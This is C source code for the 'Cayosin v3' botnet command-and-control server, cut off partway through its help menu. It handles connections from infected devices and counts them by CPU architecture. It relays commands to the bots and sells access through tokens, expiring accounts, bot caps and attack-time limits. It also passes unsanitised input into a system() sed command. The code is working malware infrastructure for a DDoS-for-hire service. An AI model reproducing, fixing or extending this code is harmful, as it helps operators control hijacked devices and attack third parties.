/*
	|	Cayosin C2 version 3.0 wrote by snickers, p.s gang shit hoe	|
	|-	Edited, Themed and Published by Erradic, p.s ramen noodles
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>
#define SUCCESS "[\x1b[32m+\x1b[37m]"
#define FAILED "[\x1b[31m-\x1b[37m]"
#define INFO "[\x1b[1;33m?\x1b[37m]"
#define Cayosin "\x1b[0m[\x1b[1;36mCayosin V3\x1b[0m]\x1b[37m"
char day[10];
char month[10];
char year[10];
char *my_day;
char my_month[10];
char my_year[10];
int cnc_port = 111; // Don't change
int bot_port = 222; // Don't change
int usersOnline = 0;

char *cnc_name = "Cayosin";
#define BOT_TRIGGER ". " // If you use a diff trigger change this - No spaces after
#define ACC_FILE "database.txt" // Account Information File
#define TOKEN_FILE "tokens.txt" // Token Placement File
#define MAXFDS 999999

int ppc, sh4, x86, x86_64, x86_32, i586, i686, arm, armv4, armv5, armv6, armv7, mips, m68k, debug, sparc, mipsel, boxes, unknown, pmalinux, pmawindows, rdp = 0;
char new_test_time[20];
struct console {
	char banned[20];
	char blacklist[20];
	char bannedlog[100];
} console[MAXFDS];

struct tokens {
	char token[40];
	int admin;
	char expire[10];
	int maxbots;
	int maxseconds;
	int cooldown;
} rtokens[MAXFDS];

struct accounts {
	char username[20];
	char password[20];
	int admin;
	char expire[15];
	int maxbots;
	int maxseconds;
	int cooldown;
} accounts[MAXFDS];

struct managers {
	//char *ip;
	char ip[18];
	int mute;
	int connected;
	char username[20];
	int admin;
	char expire[20];
	int maxbots;
	int maxseconds;
	int cooldown;
	int cdsecs;
	int cdstatus;
	char inputprompt[1024];
} managers[MAXFDS];

struct clientdata_t {
	char *ip;
	int connected;
	char arch[30];
} bots[MAXFDS];

struct clientListenerArgs {
    int sock;
    uint32_t ip;
	struct sockaddr_in client;
};

struct botListenerArgs {
    int sock;
    uint32_t ip;
	struct sockaddr_in client;
};

struct cooldownArgs {
	int sock;
	int seconds;
};

void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}

const char *get_host(uint32_t addr)
{
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = addr;
    return inet_ntoa(in_addr_ip);
}

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}

int get_time(void)
{
	time_t timer;
    struct tm* tm_info;
    time(&timer);
    tm_info = localtime(&timer);
    strftime(day, 3, "%d", tm_info);
    strftime(month, 3, "%m", tm_info);
    strftime(year, 5, "%Y", tm_info);
	//printf("%s/%s/%s\n", month, day, year);
    return 0;
}

int resolvehttp(char *  , char *);
int resolvehttp(char * site , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
         
    if ( (he = gethostbyname( site ) ) == NULL)
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
 
    addr_list = (struct in_addr **) he->h_addr_list;
     
    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
     
    return 1;
}

void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
 	if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}

int update_time(char *update)
{
	memset(new_test_time, 0, sizeof(new_test_time));
	char utday[3];
	char utmonth[3];
	char utyear[5];
	char total_time[120]; // 15
	time_t timer;
    struct tm* tm_info;
    time(&timer);
    tm_info = localtime(&timer);
    strftime(utday, 3, "%d", tm_info);
    strftime(utmonth, 3, "%m", tm_info);
    strftime(utyear, 5, "%Y", tm_info);
	//printf("%s/%s/%s\n", month, day, year);
	if(strstr(update, "day"))
	{
		int d = atoi(utday);
		int m = atoi(utmonth);
		int y = atoi(utyear);
		if(d == 31 || d == 30)
		{
			if(m == 12)
			{
				y++;
				m = 1;
				d = 1;
			}
			else
			{
				m++;
				d = 1;
			}
		}
		else
			d++;
		if(m == 12)
		{
			y++;
			m = 1;
		}
		snprintf(total_time, sizeof(total_time), "%d/%d/%d", d, m, y);
	}
	else if(strstr(update, "month"))
	{
		int d = atoi(utday);
		int m = atoi(utmonth);
		int y = atoi(utyear);
		if(m == 12)
		{
			y++;
			m = 1;
			
		}
		else
			m++;
		snprintf(total_time, sizeof(total_time), "%d/%d/%d", d, m, y);
	}
	else if(strstr(update, "year"))
	{
		int d = atoi(utday);
		int m = atoi(utmonth);
		int y = atoi(utyear);
		y++;		
		snprintf(total_time, sizeof(total_time), "%d/%d/%d", d, m, y);
	}
	snprintf(new_test_time, sizeof(new_test_time), "%s", total_time);
	//printf("time = '%s'\n", new_test_time);
	return;
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[1024]; // change 1024 to 512 if it doesnt work

    if((fp = fopen(ACC_FILE, "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}

int seach4token(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[1024]; // change 1024 to 512 if it doesnt work

    if((fp = fopen(TOKEN_FILE, "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}

void rmstr(char *str, char *file)
{
	char rmstr[1024]; // set it high so no buff over flow ever
	snprintf(rmstr, sizeof(rmstr), "sed -i '/%s/d' %s", str, file);
	system(rmstr);
	memset(rmstr, 0, sizeof(rmstr));
	return;
}

int Act2ADMS(int myfd, char *mmsg)
{
	int fd;
	char msg[1024];
	snprintf(msg, sizeof(msg), "%s\r\n", mmsg);
	for(fd=0; fd < MAXFDS; fd++)
	{
		if(fd == myfd) continue;
		if(!managers[fd].connected) continue;
		if(managers[fd].connected && managers[fd].admin && !managers[fd].mute && strlen(managers[fd].inputprompt) > 2)
		{
			if(send(fd, msg, strlen(msg), 0) == -1) continue;
			if(send(fd, managers[fd].inputprompt, strlen(managers[fd].inputprompt), 0) == -1) continue;
		}
	}
	memset(msg, 0, sizeof(msg));
	mmsg = malloc(strlen(mmsg));
	return;
}

int Act2Users(int myfd, char *mmsg)
{
	int fd;
	char msg[1024];
	snprintf(msg, sizeof(msg), "%s\r\n", mmsg);
	for(fd=0; fd < MAXFDS; fd++)
	{
		if(fd == myfd) continue;
		if(!managers[fd].connected) continue;
		if(managers[fd].connected && !managers[fd].mute && strlen(managers[fd].inputprompt) > 2)
		{
			if(send(fd, msg, strlen(msg), 0) == -1) continue;
			if(send(fd, managers[fd].inputprompt, strlen(managers[fd].inputprompt), 0) == -1) continue;
		}
	}
	memset(msg, 0, sizeof(msg));
	mmsg = malloc(strlen(mmsg));
	return;
}

int Send2Users(int myfd, char *mmsg)
{
	int fd;
	char msg[1024];
	snprintf(msg, sizeof(msg), "\x1b[0m%s: \x1b[1;33m%s\x1b[37m\r\n", managers[myfd].username, mmsg);
	for(fd=0; fd < MAXFDS; fd++)
	{
		if(fd == myfd) continue;
		if(!managers[fd].connected) continue;
		if(managers[fd].connected && !managers[fd].mute)
		{
			if(send(fd, msg, strlen(msg), 0) == -1) continue;
			if(send(fd, managers[fd].inputprompt, strlen(managers[fd].inputprompt), 0) == -1) continue;
		}
	}
	memset(msg, 0, sizeof(msg));
	mmsg = malloc(strlen(mmsg));
	return;
}

int Act2Bots(int myfd, char *mmsg)
{
	int fd;
	char msg[1024];
	snprintf(msg, sizeof(msg), "%s\r\n", mmsg);
	for(fd=0; fd < managers[myfd].maxbots; fd++)
	{
		if(!bots[fd].connected) continue;
		if(send(fd, msg, strlen(msg), 0) == -1) continue;
	}
	memset(msg, 0, sizeof(msg));
	mmsg = malloc(strlen(mmsg));
	return;
}

int botsOnline()
{
	int fd, totalbots = 0;
	for(fd=0; fd < MAXFDS; fd++)
	{
		if(bots[fd].connected == 1) totalbots++;
	}
	return totalbots;
}

void pongresp(int fd)
{
	while(1)
	{
		if(send(fd, "PING\r\n", strlen("PING\r\n"), 0) == -1) continue;
		sleep(60);
	}
	exit(0);
}

void botHandler(void *arguments)
{
    pthread_t title;
    char buffer[1024];
    struct botListenerArgs *args = arguments;
    int botfd = (int)args->sock;
    bots[botfd].ip = inet_ntoa(args->client.sin_addr);
    int xd;
	for(xd = 0; xd < MAXFDS; xd++)
		{
			if(bots[xd].connected)
			{
				if(strstr(bots[xd].ip, bots[botfd].ip))
				{
					char *failed = FAILED" Cayosin doesn't allow duped connections...\n";
					if(send(botfd, failed, strlen(failed), 0) == -1) goto end;
					failed = malloc(strlen(failed));
					goto end;
				}
			}
		}
    bots[botfd].connected = 1;
    sprintf(bots[botfd].arch, "unknown");
    
    if(!fork())
        pongresp(botfd);
    while(fdgets(buffer, sizeof buffer, botfd))
    {
        trim(buffer);
        if(strlen(buffer) == 0 || strlen(buffer) < 1) continue;
        if(!strcmp(buffer, "PONG"))
            continue;
        else if(strstr(buffer, "arch ") || strstr(buffer, "arch="))
        {
            char *arch = buffer+5;
            snprintf(bots[botfd].arch, sizeof(bots[botfd].arch), "%s", arch);
            printf(SUCCESS" IP: %s | Arch: %s\x1b[37m\n", bots[botfd].ip, bots[botfd].arch);
        }
        //else printf("\x1b[32m%d\x1b[37m(\x1b[33m%s\x1b[37m) \"%s\"\n", botfd, bots[botfd].ip, buffer);
        memset(buffer, 0, sizeof(buffer));
    }
    end:
    //printf(FAILED" bot #\x1b[32m%d\x1b[37m(\x1b[33m%s\x1b[37m) \x1b[31mtimed out\x1b[37m.\n", botfd, bots[botfd].ip);
    bots[botfd].connected = 0;
    bots[botfd].ip = malloc(strlen(bots[botfd].ip));
    memset(bots[botfd].arch, 0, sizeof(bots[botfd].arch));
    close(botfd);
    return;
}

void *titleWriter(void *sock) 
{
	int botcount = 0;
	int myfd = (int)sock;
	char *string[2048];
	while(1)
	{
		if(managers[myfd].maxbots >= botsOnline())
			botcount = botsOnline();
		else if(botsOnline() > managers[myfd].maxbots)
			botcount = managers[myfd].maxbots;
        memset(string, 0, 2048);
        sprintf(string, "%c]0; %d | Cayosin | %d %c", '\033', botcount, usersOnline, '\007');
        if(send(myfd, string, strlen(string), MSG_NOSIGNAL) == -1) return; 
        sleep(3);
	}
}

void countArch()
{
    int x;
    ppc = 0;
    sh4 = 0;
    x86 = 0;
	x86_64 = 0;
	x86_32 = 0;
	i586 = 0;
	i686 = 0;
    armv4 = 0;
    armv5 = 0;
    armv6 = 0;
    armv7 = 0;
	arm = 0;
    mips = 0;
    m68k = 0;
    debug = 0;
    sparc = 0;
    mipsel = 0;
    boxes = 0;
    pmalinux = 0;
    pmawindows = 0;
    unknown = 0;
    for(x = 0; x < MAXFDS; x++)
    {
        if(strstr(bots[x].arch, "ppc") && bots[x].connected || strstr(bots[x].arch, "powerpc") && bots[x].connected)
            ppc++;
        else if(strstr(bots[x].arch, "sh4") && bots[x].connected || strstr(bots[x].arch, "superh") && bots[x].connected)
            sh4++;
        else if(strstr(bots[x].arch, "x86_64") && bots[x].connected)
            x86_64++;
        else if(strstr(bots[x].arch, "x86_32") && bots[x].connected)
            x86_32++;
        else if(strstr(bots[x].arch, "x86") && bots[x].connected)
            x86++;
        else if(strstr(bots[x].arch, "i586") && bots[x].connected)
            i586++;
        else if(strstr(bots[x].arch, "i686") && bots[x].connected)
            i686++;
        else if(strstr(bots[x].arch, "armv4") && bots[x].connected || strstr(bots[x].arch, "arm4") && bots[x].connected)
            armv4++;
    	else if(strstr(bots[x].arch, "armv5") && bots[x].connected || strstr(bots[x].arch, "arm5") && bots[x].connected)
            armv5++;
    	else if(strstr(bots[x].arch, "armv6") && bots[x].connected || strstr(bots[x].arch, "arm6") && bots[x].connected)
            armv6++;
        else if(strstr(bots[x].arch, "armv7") && bots[x].connected || strstr(bots[x].arch, "arm7") && bots[x].connected)
            armv7++;
        else if(strstr(bots[x].arch, "arm") && bots[x].connected)
            arm++;
        else if(strstr(bots[x].arch, "mpsl") || strstr(bots[x].arch, "mipsel") && bots[x].connected)
            mipsel++;
        else if(strstr(bots[x].arch, "mips") && bots[x].connected)
            mips++;
        else if(strstr(bots[x].arch, "m68k") && bots[x].connected)
            m68k++;
        else if(strstr(bots[x].arch, "debug") && bots[x].connected)
            debug++;
        else if(strstr(bots[x].arch, "sparc") && bots[x].connected)
            sparc++;
		else if(strstr(bots[x].arch, "rdp") && bots[x].connected)
            rdp++;
        else if(strstr(bots[x].arch, "servers") || strstr(bots[x].arch, "boxes") || strstr(bots[x].arch, "box") && bots[x].connected)
            boxes++;
        else if(strstr(bots[x].arch, "pma") && strstr(bots[x].arch, "linux") && bots[x].connected)
            pmalinux++;
        else if(strstr(bots[x].arch, "pma") && bots[x].connected)
		{
			if(strstr(bots[x].arch, "windows") || strstr(bots[x].arch, "win") || strstr(bots[x].arch, "WIN"))
				pmawindows++;
		}
        else if(strstr(bots[x].arch, "unknown") && bots[x].connected == 1)
            unknown++;
    }
}

void en_cooldown(void *arguments)
{
	struct cooldownArgs *args = arguments;
	int fd = (int)args->sock;
	int seconds = (int)args->seconds;
	//printf("cooldown started for \x1b[33m%s\x1b[37m for \x1b[35m%d\x1b[37m second(s)\n", managers[fd].username, managers[fd].cooldown);
	managers[fd].cdsecs = 0;
	time_t start = time(NULL);
	if(managers[fd].cdstatus == 0)
		managers[fd].cdstatus = 1;
	while(managers[fd].cdsecs++ <= seconds) sleep(1);
	//printf("Cooldown for \x1b[33m%s\x1b[37m reanabled...\n", managers[fd].username);
	managers[fd].cdsecs = 0;
	managers[fd].cdstatus = 0;
	return;
}

void clientHandler(void *arguments)
{
	srand(time(NULL) + getpid());
	struct clientListenerArgs *args = arguments;
	int myfd = (int)args->sock;
	sprintf(managers[myfd].ip, "%s", inet_ntoa(args->client.sin_addr));
	int kek_line;
	char str[1024];
	char buffer[1024];
	pthread_t title;
	char *register_token;
	char u[1024];
	
    FILE *dp;
    int x=0;
    int y;
    dp=fopen(TOKEN_FILE, "r");
	if(dp == NULL)
	{
		printf(FAILED" Failed to start C2, No Tokens Found...\n");
		exit(0);
	}
    else if(dp != NULL)
	{
	    while(!feof(dp)) 
		{
				y=fgetc(dp);
				++x;
	    }
	    int z=0;
	    rewind(dp);
	    while(z!=x-1) 
		{
			fscanf(dp, "%s %d %s %d %d %d", rtokens[z].token, &rtokens[z].admin, rtokens[z].expire, &rtokens[z].maxbots, &rtokens[z].maxseconds, &rtokens[z].cooldown);
			++z;
	    }
	}
	
    FILE *fp;
    int i=0;
    int c;
    fp=fopen(ACC_FILE, "r"); 
    while(!feof(fp)) 
	{
			c=fgetc(fp);
			++i;
    }
    int j=0;
    rewind(fp);
    while(j!=i-1) 
	{
		fscanf(fp, "%s %s %d %s %d %d %d", accounts[j].username, accounts[j].password, &accounts[j].admin, accounts[j].expire, &accounts[j].maxbots, &accounts[j].maxseconds, &accounts[j].cooldown);
		++j;
    }

	while(fdgets(buffer, sizeof buffer, myfd) < 1)
	{
		trim(buffer);
		if(strlen(buffer) < 3) continue;
		break;
	}
	trim(buffer);
	if(!strcmp(buffer, "login"))
		goto login;
	else if(strstr(buffer, "register "))
	{
		register_token = buffer + strlen("register ");
		trim(register_token);
		if(strlen(register_token) >= 3) goto register_new;
	}
	else
		goto end;
	
	register_new:
	sprintf(str, "\x1b[33mValidating Token\x1b[31m...\x1b[37m\r\n");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	char ranswer[4];
	int find_token, answer, found = 0;
	find_token = seach4token(register_token);
	if(!strcmp(rtokens[find_token].token, register_token))
	{
		snprintf(str, sizeof(str), "Token is valid for: \x1b[1;36m%s\x1b[37m - Would you like to redeem this token?(Y/N): \x1b[0m", rtokens[find_token].expire);
		if(send(myfd, str, strlen(str), 0) == -1) goto end;
		found = 1;
		memset(buffer, 0, sizeof(buffer));
		//if((fdgets(ranswer, sizeof(ranswer), myfd)) < 0) goto end;
		while(fdgets(ranswer, sizeof ranswer, myfd) < 1)
		{
			trim(ranswer);
			if(strlen(ranswer) < 3) continue;
			break;
		}
		trim(ranswer);
		if(!strcmp(ranswer, "Y") || !strcmp(ranswer, "y"))
			answer = 1;
		memset(ranswer, 0, sizeof(ranswer));
	}
	if(!found)
	{
		snprintf(str, sizeof(str), "The Token \x1b[31m%s\x1b[37m, Does not exist in our system. Goodbye...\r\n", register_token);
		if(send(myfd, str, strlen(str), 0) == -1) goto end;
		goto end;
	}
	if(answer)
	{
		char new_username[20];
		char new_password[20];
		int new_admin, new_maxbots, new_maxseconds, new_cooldown = 0;
		char new_expire[15];
		int find_user = 0;
		reuser:
		sprintf(str, "\x1b[1;36mUsername: \x1b[37m");
		if(send(myfd, str, strlen(str), 0) == -1) goto end;
		while(fdgets(new_username, sizeof new_username, myfd) < 1)
		{
			trim(new_username);
			if(strlen(new_username) < 3) continue;
			break;
		}
		trim(new_username);
		int x;
		for(x=0; x < MAXFDS; x++)
		{
			if(!strcmp(accounts[x].username, new_username))
			{
				snprintf(str, sizeof(str), "\x1b[31mSorry, The Username %s is Already Taken\x1b[37m...\r\n", new_username);
				if(send(myfd, str, strlen(str), 0) == -1) goto end;
				goto reuser;
			}
		}
		sprintf(str, "\x1b[1;36mPassword: \x1b[37m");
		if(send(myfd, str, strlen(str), 0) == -1) goto end;
		if((fdgets(new_password, sizeof(new_password), myfd)) < 0) goto end;
		sleep(0.8);
		trim(new_password);
		if(rtokens[find_token].admin == 1) new_admin = 1;
		new_maxbots = rtokens[find_token].maxbots;
		new_maxseconds = rtokens[find_token].maxseconds;
		new_cooldown = rtokens[find_token].cooldown;
		snprintf(new_expire, sizeof(new_expire), "%s", rtokens[find_token].expire);
	 	update_time(new_expire);
		sprintf(str, "\x1b[32m%s Account Successfully Created. \x1b[1;36mYour Account Expires On \x1b[1;33m%s\x1b[37m\r\n", cnc_name, new_test_time);
		if(send(myfd, str, strlen(str), 0) == -1) goto end;
		FILE *auf = fopen(ACC_FILE, "a");
		fprintf(auf, "%s %s %d %s %d %d %d\n", new_username, new_password, new_admin, new_test_time, new_maxbots, new_maxseconds, new_cooldown);
		fclose(auf);
		rmstr(rtokens[find_token].token, TOKEN_FILE);
		//printf("Username: %s | Password: %s | Admin: %d | Max Bots: %d | Max BootTime: %d\n", new_username, new_password, new_admin, new_maxbots, new_maxseconds);
		memset(new_username, 0, sizeof(new_username));
		memset(new_password, 0, sizeof(new_password));
		memset(new_expire, 0, sizeof(new_expire));
		sleep(2);
		goto end;
	}
	
	login:
	memset(str, 0, sizeof(str));
	memset(buffer, 0, sizeof(buffer));
	int h;
	for(h=0; h < MAXFDS; h++)
	{
		if(strlen(console[h].banned) < 1) continue;
		if(!strcmp(console[h].banned, managers[myfd].ip))
		{
			sprintf(str, "\x1b[31mSorry, You Have Been Banned!\x1b[37m\r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			goto end;
		}
	}
	if(send(myfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
	dfhsdgF:
	sprintf(str,  "\x1b[0mWelcome to \x1b[1;36mCayosin v3 \x1b[0m\r\n");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
    sprintf(str,  "\x1b[1;36mRespect Others + Device Count\x1b[0m\r\n");
    if(send(myfd, str, strlen(str), 0) == -1) goto end;
    sprintf(str,  "\x1b[1;36mDO \x1b[31mNOT \x1b[1;36mShare Logins\x1b[0m\r\n");
    if(send(myfd, str, strlen(str), 0) == -1) goto end;
    sprintf(str,  "\x1b[1;36mPlan Upgrades Are Available\x1b[0m\r\n\r\n");
    if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[1;33mUsername\x1b[1;36m: \x1b[37m");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	while(fdgets(buffer, sizeof buffer, myfd) < 1)
	{
		if(strlen(buffer) < 3) continue;
		trim(buffer);
		break;
	}
	char nickstring[30];
	snprintf(nickstring, sizeof(nickstring), "%s", buffer);
	memset(buffer, 0, sizeof(buffer));
	trim(nickstring);
	if(strlen(nickstring) <= 1)
		goto dfhsdgF;
	kek_line = Search_in_File(nickstring);
	if(!strcmp(accounts[kek_line].username, nickstring))
	{
		int l;
		for(l=0; l < MAXFDS; l++)
		{
			if(!strcmp(managers[l].username, nickstring))
			{
				sprintf(str, "\x1b[31mUser is Already Logged in on this Network\x1b[37m...\r\n");
				if(send(myfd, str, strlen(str), 0) == -1) goto end;
				sleep(2);
				goto end;
			}
		}
		goto expire_check;
		send_password:
		snprintf(str, sizeof(str), "\x1b[1;33m%s's Password\x1b[1;36m: \x1b[37m", nickstring);
		if(send(myfd, str, strlen(str), 0) == -1) goto end;
		while(fdgets(buffer, sizeof buffer, myfd) < 1)
		{
			if(strlen(buffer) < 3) continue;
			trim(buffer);
			break;
		}
		if(send(myfd, "\x1b[37m", strlen("\x1b[37m"), 0) == -1) goto end;
		char *password = ("%s", buffer);
		trim(password);
		if(strcmp(accounts[kek_line].password, password))
		{
			sprintf(str, "\x1b[31mIncorrect Credentials, Connection Logged!\x1b[37m\r\n");
			if(send(myfd, str, strlen(str), 0) == -1) goto end;
			FILE *failed;
			failed = fopen("failed_attempts.log", "a");
			if(failed == NULL)
				failed = fopen("failed_attempts.log", "w");
			fprintf(failed, "\x1b[31mAttempted Login - Username [%s] Connection [%s]\n", nickstring, managers[myfd].ip);
			fclose(failed);
			printf("\x1b[31mAttempted Login - Username [%s] Connection [%s]\n", nickstring, managers[myfd].ip);
			goto end;
		}
		else if(!strcmp(accounts[kek_line].password, password))
		{
			password = malloc(strlen(password));
			goto success_login;
		}
	}
	else if(strcmp(accounts[kek_line].username, nickstring))
	{
		sprintf(str, "\x1b[31mIncorrect Credentials, Connection Logged! \x1b[37m\r\n");
		if(send(myfd, str, strlen(str), 0) == -1) goto end;
		FILE *failed;
		failed = fopen("failed_attempts.log", "a");
		if(failed == NULL)
			failed = fopen("failed_attempts.log", "w");
		fprintf(failed, "\x1b[31mAttempted Login - Username [%s] Connection [%s]\n", nickstring, managers[myfd].ip);
		fclose(failed);
		printf("\x1b[31mAttempted Login - Username [%s] Connection [%s]\n", nickstring, managers[myfd].ip);
		goto end;
	}
	
	expire_check:
	get_time();
	snprintf(managers[myfd].expire, sizeof(managers[myfd].expire), "%s", accounts[kek_line].expire);
	my_day = strtok(accounts[kek_line].expire, "/");
	snprintf(my_month, sizeof(my_month), "%s", my_day+strlen(my_day)+1);
	snprintf(my_year, sizeof(my_year), "%s", strtok(accounts[kek_line].expire, "/")+1+strlen(my_month)-2);
	char *my_exp_msg;
	if(atoi(day) > atoi(my_day) && atoi(month) >= atoi(my_month) || atoi(month) > atoi(my_month) && atoi(year) >= atoi(my_year) || atoi(year) > atoi(my_year))
	{
		// expired
		if(send(myfd, "\033[2J\033[1;1H", 14, 0) == -1) goto end;
		my_exp_msg = "\x1b[31mYour \x1b[1;36mCayosin\x1b[31m Account Has Expired, Message an Admin to Renew Subscription.\x1b[37m\r\n";
		if(send(myfd, my_exp_msg, strlen(my_exp_msg), 0) == -1) goto end;
		//printf(my_exp_msg);
		my_exp_msg = malloc(strlen(my_exp_msg));
		sleep(2);
		rmstr(nickstring, ACC_FILE);
		goto end;
	}
	else if(atoi(day) == atoi(my_day) && atoi(month) == atoi(my_month) && atoi(year) == atoi(my_year))
	{
		// expires today
		//if(send(myfd, "\033[2J\033[1;1H", 14, 0) == -1) goto end;
		my_exp_msg = "\x1b[31mYour \x1b[1;36mCayosin\x1b[31m Account Expires Today, Message an Admin to Renew Subscription.\x1b[37m\r\n";
		if(send(myfd, my_exp_msg, strlen(my_exp_msg), 0) == -1) goto end;
		//printf(my_exp_msg);
		my_exp_msg = malloc(strlen(my_exp_msg));
		goto send_password;
	}
	else
    	goto send_password;
	
	success_login:
	pthread_create(&title, NULL, &titleWriter, myfd);
	usersOnline++;
	managers[myfd].connected = 1;
	managers[myfd].mute = 1;
	snprintf(managers[myfd].username, sizeof(managers[myfd].username), "%s", nickstring);
	memset(nickstring, 0, sizeof(nickstring));
	managers[myfd].admin = accounts[kek_line].admin;
	if(accounts[kek_line].maxbots == -1) managers[myfd].maxbots = 999999;
	else managers[myfd].maxbots = accounts[kek_line].maxbots;
	if(accounts[kek_line].maxseconds == -1) managers[myfd].maxseconds = 999999;
	else managers[myfd].maxseconds = accounts[kek_line].maxseconds;
	managers[myfd].cooldown = accounts[kek_line].cooldown;
	if(managers[myfd].connected) printf("\x1b[1;36m[\x1b[1;33m%s Connected!\x1b[1;36m]\x1b[37m\n", managers[myfd].username);
	if(managers[myfd].connected) snprintf(u, sizeof(u), "\x1b[1;36m[\x1b[1;33m%s Connected!\x1b[1;36m]\x1b[37m", managers[myfd].username);
	Act2Users(myfd, u);
	memset(u, 0, sizeof(u));
	if(send(myfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
	sprintf(str, SUCCESS"\x1b[1;36m Welcome %s...\x1b[37m\r\n", managers[myfd].username);
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, SUCCESS"\x1b[1;36m Account Expiry: \x1b[1;33m%s\x1b[37m\r\n", managers[myfd].expire);
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	if(managers[myfd].maxbots > botsOnline())
		sprintf(str, SUCCESS"\x1b[1;36m Available Bots: \x1b[0m[\x1b[1;36m%d\x1b[0m]\x1b[37m\r\n\r\n", botsOnline());
	else
		sprintf(str, SUCCESS"\x1b[1;36m Available Bots: \x1b[0m[\x1b[1;36m%d\x1b[0m]\x1b[37m\r\n\r\n", managers[myfd].maxbots);
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[1;36m               ╔═╗   ╔═╗   ╗ ╔   ╔═╗   ╔═╗   ═╔═   ╔╗╔              \x1b[0m \r\n");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[0m               ║     ║═║   ╚╔╝   ║ ║   ╚═╗    ║    ║║║              \x1b[0m \r\n");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[90m               ╚═╝   ╝ ╚   ═╝═   ╚═╝   ╚═╝   ═╝═   ╝╚╝  \x1b[1;36mv3          \x1b[0m \r\n");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[1;36m          ╔═══════════════════════════════════════════════╗         \x1b[0m \r\n");;
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[1;36m          ║\x1b[90m- - - - - \x1b[1;36m彼   ら  の  心   を  切  る\x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[1;36m          ║\x1b[90m- - - - - \x1b[0mType \x1b[1;36mHELP \x1b[0mfor \x1b[1;36mCommands List \x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[1;36m          ╚═══════════════════════════════════════════════╝         \x1b[0m \r\n\r\n");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	snprintf(managers[myfd].inputprompt, sizeof(managers[myfd].inputprompt), "\x1b[1;36m%s\x1b[0m#\x1b[1;36m: \x1b[37m", managers[myfd].username);
	if(send(myfd, managers[myfd].inputprompt, strlen(managers[myfd].inputprompt), 0) == -1) goto end;
	memset(buffer, 0, sizeof(buffer));
	int status;
	while(fdgets(buffer, sizeof buffer, myfd))
	{
		status = 0;
		trim(buffer);
		if(strlen(buffer) == 0 || buffer == NULL) continue;
		//printf("buffer = '%s'\n", buffer);
		if(!strcmp(buffer, "help") || !strcmp(buffer, "HELP"))
        {           
            sprintf(str, "\x1b[1;36m╔═════════════════════════════════════╗\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
            sprintf(str, "\x1b[1;36m║ METHODS \x1b[90m- \x1b[0mShows Attack Commands     \x1b[1;36m║\x1b[0m\r\n");
            if(send(myfd, str, strlen(str), 0) == -1) goto end;
